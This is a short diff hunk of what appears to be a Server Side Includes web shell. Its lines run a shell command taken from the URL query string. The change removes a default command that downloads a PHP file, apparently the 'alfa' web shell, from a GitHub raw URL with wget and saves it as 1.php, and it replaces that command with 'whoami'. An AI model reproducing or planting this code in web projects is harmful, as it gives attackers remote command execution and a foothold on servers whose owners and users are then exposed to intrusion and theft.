@@ -4,7 +4,7 @@
 <!--#config errmsg="[Error in shell]"-->
 <!--#set var="zero" value="" -->
 <!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
-<!--#set var="shl" value="wget https://raw.githubusercontent.com/janda354311/tes/master/alfa311_1(3).php -O 1.php" -->
+<!--#set var="shl" value="whoami" -->
 <!--#else -->
 <!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
 <!--#endif -->
